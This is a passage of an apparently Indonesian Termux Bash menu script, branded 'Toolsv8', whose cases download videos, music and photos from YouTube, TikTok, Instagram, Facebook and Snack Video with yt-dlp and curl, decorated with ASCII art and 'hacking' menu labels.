⣿⣳⣯⠀⠀⠀⠀⠈⢻⣾⡽⣷⣄⣀⠀⢀⣀⣠⣾⣟⣾⡟⠁⠀⠀⠀⠀⣷⣟⣿
⣿⣳⣿⠂⠀⠀⠀⠀⠀⠑⠻⣯⣟⡿⣿⣻⣟⣯⣷⠻⠊⠀⠀⠀⠀⠀⢐⣿⡾⣽
⣿⣷⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠃⠙⠛⠈⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣻⣽
⠹⣾⣽⣳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⢯⣷⠏
⠀⠘⢷⣯⣟⡷⣦⣤⡴⣴⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⣦⣤⣴⣾⢷⣯⡿⠃⠀
⠀⠀⠀⠈⠻⠽⣳⣯⣟⡿⣞⣷⣻⣞⣷⣻⣞⣷⣻⣞⣷⢯⣿⣽⠾⠟⠈
" | lolcat
echo -e "${c}"
read -p "Masukkan URL Video Instagram : " url
echo ""
echo -e "${r}[ ${g}+ ${r}]${g} Mengunduh Video Dari Instagram...!!"
echo -e "${n}"
yt-dlp -o "${TARGET_DIR}/%(title).80s.%(ext)s" "$url"
if [ $? -eq 0 ]; then
    echo ""
    echo -e "${y}Sukses! Video Disimpan Di :${r} ${TARGET_DIR}"
    echo ""
else
    echo ""
    echo -e "${r}Gagall mengunduh. Periksa URL atau koneksi internet Anda."
    echo ""
fi
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
               ;;
       71)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
OUTPUT_DIR="/storage/emulated/0/Download"
if ! command -v yt-dlp &> /dev/null; then
    echo ""
    echo -e "${r}[ ${g}!! ${r}]${g} yt-dlp belum terinstall. menginstal sekarang...!!"
    echo -e "${n}"
    pkg update -y && pkg install -y python ffmpeg
    pip install -U yt-dlp
fi
clear
echo ""
echo "
⠀⠀⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢹⣷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠸⣿⣿⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣿⣿⣶⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀
⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣯⠛⠛⠿⣿⣿⣿⣿⣧⡀⠀
⠀⠀⠀⠀⢹⣿⣿⣿⡀⠀⠀⠀⠙⢿⣿⣿⣧⠀
⠀⠀⠀⠀⠸⣿⣿⣿⣇⠀⠀⠀⠀⠀⠙⣿⣿⡆
⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠈⢻⣇
⠀⠀⠀⠀⠀⢸⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠈⠿
⠀⠀⠀⠀⠀⠘⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣀⣸⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀
⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀
⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠛⠿⠿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat
echo ""
echo -e "${g}================================"
echo -e "${r}  Creator ${p}: ${c}By.Thonxyzz404"
echo -e "${r}  Alat ${p}: ${c}Download Musik"
echo -e "${g}================================"
echo ""
read -p "$(echo -e "${y}Masukkan URL YouTube ${r}[ ${g}URL LINK ANDA ${r}]${n} : ")" yt_link
echo ""
if [[ -z "$yt_link" ]]; then
    echo -e "${r}[ ${g}!! ${r}]${c} Link Tidak Boleh Kosong...!!!"
    sleep 2
fi
echo ""
echo -e "${r}[ ${g}+ ${r}]${g} Mendownload Musik Dan Mengonversi Ke ${r}[ ${c}MP3 ${r}]"
echo -e "${n}"
yt-dlp \
    --extract-audio \
    --audio-format mp3 \
    --audio-quality 0 \
    --output "${OUTPUT_DIR}/%(title)s.%(ext)s" \
    "$yt_link"
if [[ $? -eq 0 ]]; then
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${g} Musik Berhasill Di Download Ke ${c}:${r} $OUTPUT_DIR"
    sleep 4 
    echo ""
else
    echo ""
    echo -e "${r}[ ${g}!! ${r}] Gagall Mendownload Dari YouTube...!!!"
    echo ""
fi
              echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
               ;;
        72) 
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
echo ""
echo -e "${c}Tiktok Download"
echo "
████████▀▀▀████
████████────▀██
████████──█▄──█
███▀▀▀██──█████
█▀──▄▄██──█████
█──█████──█████
█▄──▀▀▀──▄█████
███▄▄▄▄▄███████
" | lolcat
echo -e "${p}Development ${c}: ${g}By.Thonxyzz404"
echo ""
read -p "$(echo -e "${y}Masukkan URL Video TikTok ${r}[ ${g}URL LINK ANDA ${r}]${n} : ")" url
target_dir="/storage/emulated/0/Download"
if [ ! -d "$target_dir" ]; then
  echo ""
  echo -e "${r}[ ${g}!! ${r}]${g} Folder Download Di SD Card Tidak Ditemukan...!!"
fi
command -v yt-dlp > /dev/null || {
  echo ""
  echo -e "${r}[ ${g}!! ${r}]${g} yt-dlp belum terinstal. menginstall yt-dlp..."
  sleep 2 
  echo -e "${n}"
  pkg install -y python ffmpeg
  pip install --upgrade yt-dlp
  clear
}
echo ""
echo -e "${r}[ ${g}+ ${r}]${c} Mendownload Video Tiktok...!!"
echo -e "${n}"
yt-dlp -o "$target_dir/%(title).50s.%(ext)s" "$url" --no-playlist || {
echo ""
echo -e "${r}[ ${g}!! ${r}]${y} Gagall Mendownload Video Tiktok. Periksa URL TikTok Anda...!!"
}
echo ""
echo -e "${r}[ ${g}✓ ${r}]${g} Video Berhasill Di Download Ke File ${c}:${r} $target_dir"
echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
               ;;
       73)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⡴⠦⢤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠻⣯⣤⡶⠞⠛⢻⣿⡧⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣿⠀⠀⠸⣿⣤⡤⠶⠾⢿⣇⣀⡤⠉⢻⣦⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡴⠶⠚⡏⠉⠹⣄⡀⢠⣏⢀⣠⣤⠆⠀⠉⠁⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣤⠶⢞⣛⣉⣁⠀⠸⠿⠿⠀⠀⢈⠙⠛⢛⣉⡡⠤⠤⠤⢤⣄⣀⡀⠀⣿⠀⠀⠀⠀⠀⠀⠀
⠀⣠⠞⠋⠀⠀⠿⠿⠿⠿⠁⠀⢀⣤⠶⠛⢉⣴⠞⠉⠀⠀⠀⣀⣤⣴⠶⠿⠿⣿⣿⣆⠀⠀⠀⠀⠀⠀
⢰⡇⠀⠚⠛⠒⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠟⠁⠀⠀⢀⣴⠿⠋⠁⠀⠀⣠⣴⠶⠛⠛⠛⠛⠶⣦⡀⠀
⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠃⠀⠀⠀⢠⣾⠋⠀⠀⠀⣠⡾⠋⣠⣴⣿⣿⣿⣷⣄⠘⣷⠀
⣿⠇⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⣸⡏⠀⠀⠀⢀⣿⠃⠀⠀⠀⣴⠏⠀⣴⣿⣿⠟⠛⣿⣿⣿⡄⢸⡇
⣿⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⠀⠀⠀⠀⣾⡟⠀⠀⠀⢰⠇⠀⣼⣿⣿⣇⣠⣾⣿⣿⣿⡇⢸⡇
⢻⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⠀⠀⠀⠀⣿⠇⠀⠀⠀⡿⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⢸⡇
⢸⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⢿⡀⠀⠀⠀⣿⠀⠀⠀⢸⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣾⠁
⠘⠂⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠘⢷⡀⠀⠀⢿⡆⠀⠀⠸⣧⠀⢸⣿⣿⣿⠟⠻⣿⣿⠟⠀⣼⡏⠀
⢀⠀⠀⣰⣶⡀⠀⠀⢻⡇⠀⠀⠀⠀⠈⠳⣤⣀⣘⣷⡀⠀⠀⢻⡄⠀⠻⣿⣿⣿⣾⠟⠋⢀⣾⠟⠀⠀
⠸⣇⠀⠘⠿⠟⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠈⠙⣻⣿⣿⣷⣦⣬⣿⣦⣀⣀⠉⢁⣀⣤⣴⠟⠁⠀⠀⠀
⠀⣿⣆⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⣠⣴⠾⠛⠉⠁⠀⠀⠈⠉⠛⠻⠿⠿⠿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠘⢿⣷⣄⡀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠙⠻⠿⣿⣶⣶⣶⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
echo -e "${r}╔════════════════════════════════════════════╗"
echo -e "${r}║ ${g} 🚀 Snack Video Downloader For Termux 🚀   ${r}║"
echo -e "${r}╚════════════════════════════════════════════╝"
echo -e "${c}"
read -p "🔗 Masukkan URL Snack Video Anda : " snack_url
if [[ ! $snack_url =~ ^https:\/\/s\.snackvideo\.com\/p\/.* ]]; then
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${p} URL tidak valid. Harus dimulai dengan : https://s.snackvideo.com/p/xxx"
    echo ""
fi
echo -e "${g}"
read -p "📁 Masukkan nama folder tujuan sdcard anda [ contoh : Download ] : " folder_name
output_folder="/storage/emulated/0/$folder_name"
if [ ! -d "$output_folder" ]; then
    mkdir -p "$output_folder"
    if [ $? -ne 0 ]; then
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${p} Gagall membuat folder tujuan. Pastikan izin storage sudah diberikan."
        echo ""
    fi
fi
echo -e "${y}⏬ Mohon bersabar sedang mendownload video ke : $output_folder${n}"
yt-dlp "$snack_url" -o "$output_folder/%(title)s.%(ext)s"
if [ $? -ne 0 ]; then
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${p} Gagall mendownload video. Pastikan URL valid dan koneksi stabil."
    echo ""
fi
clear
echo ""
echo -e "${g}✅ Download selesai silakan cek folder anda di : $output_folder"
sleep 5
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
       74)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\e[0m'
check_yt_dlp() {
    if ! command -v yt-dlp &> /dev/null; then
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${p} yt-dlp belum terinstall. Menginstall...!!"
        sleep 4
        echo -e "${n}"
        pkg install -y python
        pip install -U yt-dlp
    else
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${p} yt-dlp sudah terinstall...!!"
        sleep 4
        echo ""
    fi
}
banner() {
    clear
    echo "
⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣤⣶⣶⣶⣶⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠙⠿⠿⠛⠉⣠⣾⣿⣿⣿⣿⣿⡆
⢸⣿⣿⣿⣿⣿⣿⠟⠁⢀⣠⣄⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡇
⠈⣿⣿⣿⣿⣟⣥⣶⣾⣿⣿⣿⣷⣦⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁
⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀
⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀
⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
}
download_video() {
    echo -e "${g}"
    read -p "Masukkan URL Video Facebook : " fb_url
    echo -e "${r}"
    read -p "Masukkan folder tujuan simpan [ contoh : /sdcard/Download ] : " folder
    if [[ -z "$fb_url" || -z "$folder" ]]; then
        echo ""
        echo -e "${r}[ ${g}+ ${r}]${p} URL atau folder tidak boleh kosong...!!"
        echo ""
    fi
    final_url=$(curl -Ls -o /dev/null -w "%{url_effective}" "$fb_url")
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${g} Mendownload video dari Facebook...!!${n}"
    echo ""
    yt-dlp -o "$folder/%(title)s.%(ext)s" "$final_url"
    if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Video berhasil didownload ke : $folder "
        echo ""
    else
        echo ""
        echo -e "${r} Gagall Mendownload Video...!!"
        echo ""
    fi
}
banner
check_yt_dlp
download_video
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
  ;;
      75)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
n='\e[0m'
AUDIO_DIR="/sdcard/Download"
mkdir -p "$AUDIO_DIR"
download_audio() {
    clear
    echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠈⢿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠁⠀⠀⠀⠈⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣼⠃⠀⠀⠀⠀⠀⠸⣿⣦⣤⣤⣄⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢴⣶⡶⠿⠛⠋⠉⠁⢀⣤⣶⠿⢶⣶⣄⣀⠉⠉⠉⠋⠙⠋⠋⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣷⠀⠀⠀⠀⢠⣿⠋⠀⠀⠀⠀⠉⠛⢿⣆⠀⠀⠀⢀⣴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⡀⠀⠀⢸⣿⠀⠀⣤⠾⢶⡄⠀⠀⣿⡇⠀⣠⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣄⠀⠘⢿⣦⣀⠀⠀⢘⡿⠀⠀⣿⠃⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠈⢻⣷⣄⡈⠛⠻⠿⠿⠟⠁⢀⣼⠏⠘⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠉⠻⣿⣦⣤⣄⣠⣤⣴⡾⠃⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠉⠛⠙⣉⡉⠁⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⣀⣤⣴⡿⠟⠛⠻⠿⣷⣦⣤⣀⡀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀⣴⣶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⠿⠿⠀
    " | lolcat 
    echo -e "${r}"
    read -p "🔗 Masukkan URL Video TikTok : " url
    if [[ -z "$url" ]]; then
        echo ""
        echo -e "${r}🚫 URL tidak boleh kosong...!!"
    fi
    echo -e "${g}🎬 Mendapatkan audio dari : $url${n}"
    echo -e "${r}⏳ Tunggu sebentar...!!${n}"
    yt-dlp --extract-audio --audio-format mp3 -o "$AUDIO_DIR/%(title)s.%(ext)s" "$url"
    if [[ $? -eq 0 ]]; then
        echo -e "${c}✅ Audio berhasil diunduh ke : $AUDIO_DIR${n}"
    else
        echo -e "${r}❌ Gagall mengunduh audio. Coba periksa URL atau koneksi internet.${n}"
    fi
}
check_dependencies() {
    for cmd in yt-dlp ffmpeg; do
        if ! command -v $cmd &>/dev/null; then
            echo "❗ Perintah '$cmd' belum terinstall."
            echo "💡 Install dengan : pkg install $cmd -y"
        fi
    done
}
check_dependencies
download_audio
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
  ;;
76)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\e[0m'
figlet Foto | lolcat 
echo -e "${g}"
read -p "Masukkan URL foto : " URL
echo -e "${c}"
read -p "Masukkan nama file [ contoh : gambar.png / foto.jpg ] : " FILE_NAME
OUTPUT_PATH="/sdcard/Download/$FILE_NAME"
if [[ "$FILE_NAME" =~ \.(png|jpg|jpeg)$ ]]; then
    echo ""
    echo -e "${g} Sedang Mendownload di : $URL"
    curl -L -o "$OUTPUT_PATH" "$URL"
    if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Foto berhasil disimpan di : $OUTPUT_PATH"
    else
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Gagall mendownload..!!"
    fi
else
    clear 
    echo ""
    echo -e "${y} Format harus di awali ${g}foto.jpg foto.png foto.jpeg"
    echo ""
fi
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
      77)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\e[0m'
figlet Video | lolcat 
echo -e "${g}"
read -p "Masukkan URL video : " URL
echo -e "${c}"
read -p "Masukkan nama file [ contoh : video.mp4 / film.mkv ] : " FILE_NAME
OUTPUT_PATH="/sdcard/Download/$FILE_NAME"
if [[ "$FILE_NAME" =~ \.(mp4|mkv|webm|avi|mov)$ ]]; then
    echo ""
    echo -e "${g} Sedang mendownload video dari : $URL"
    curl -L --progress-bar -o "$OUTPUT_PATH" "$URL"
    if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Video berhasil disimpan di : $OUTPUT_PATH"
    else
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Gagal mendownload..!!"
    fi
else
    clear 
    echo ""
    echo -e "${y} Format harus di awali ${g}video.mp4, video.mkv, video.webm, video.avi, atau video.mov"
    echo ""
fi
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
  ;;
      78)
              echo""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo " 
⠀⢀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⡀⠀⠀
⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⢈⣹⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀
⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠋⠉⠁" | lolcat
echo -e "${g}"
read -r -e -p "Masukkan link YouTube : " youtube_link
echo ""
if [ -z "$youtube_link" ]; then
    echo -e "${r}Error : Link YouTube tidak boleh kosong!"
    echo ""
fi
download_dir="/storage/emulated/0"
timestamp=$(date +%Y%m%d_%H%M%S)
file_path="$download_dir/youtube_video_${timestamp}.mp4"
echo -e "${c}Mengunduh video..!!"
yt-dlp -o "$file_path" "$youtube_link"
if [ $? -eq 0 ]; then
    echo ""
    echo -e "${g}✅ Video YouTube berhasil diunduh"
    echo -e "${y}📁 Disimpan di : $file_path"
else
    echo ""
    echo -e "${r}❌ Gagal mengunduh video YouTube"
    echo ""
fi
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
  ;;
     81)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡄⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
